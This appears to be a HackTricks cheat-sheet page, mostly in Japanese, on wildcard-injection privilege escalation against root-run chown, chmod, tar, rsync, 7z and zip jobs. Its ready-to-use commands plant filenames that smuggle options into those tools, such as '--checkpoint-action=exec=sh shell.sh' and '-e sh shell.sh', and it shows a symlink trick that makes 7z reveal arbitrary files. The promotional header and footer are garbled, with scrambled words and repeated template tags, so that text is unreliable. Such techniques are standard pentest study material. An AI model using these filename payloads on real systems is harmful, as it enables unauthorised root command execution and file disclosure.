{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

ファイルの所有者と権限を他のファイルにコピーすることができます。
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**任意のコマンドを実行する:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
この脆弱性を利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar攻撃)_\
詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) を参照してください。

## Rsync

**任意のコマンドを実行する:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

**7z** では、`--` を `*` の前に使用しても（`--` は次の入力がパラメータとして扱われないことを意味するので、この場合はファイルパスのみ）、任意のエラーを引き起こしてファイルを読み取ることができます。したがって、次のようなコマンドが root によって実行されている場合：
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
そして、これが実行されているフォルダーにファイルを作成できるので、`@root.txt`というファイルと、読みたいファイルへの**シンボリックリンク**である`root.txt`というファイルを作成できます：
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
その後、**7z** が実行されると、`root.txt` を圧縮すべきファイルのリストを含むファイルとして扱います（それが `@root.txt` の存在が示すことです）そして、7z が `root.txt` を読み込むと、`/file/you/want/to/read` を読み込み、**このファイルの内容がファイルのリストでないため、エラーをスローします** その内容を表示します。

_詳細は HackTheBox の CTF ボックスの Write-ups にあります。_

## Zip

**任意のコマンドを実行する:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS ハッキングの実践:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
GCP の学習 & 実践<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

* [**GitHubでのサブスクリプション**](https://github.com/sponsors/carlospolop)をチェックしてください!
* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください!haktick\_ive\
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
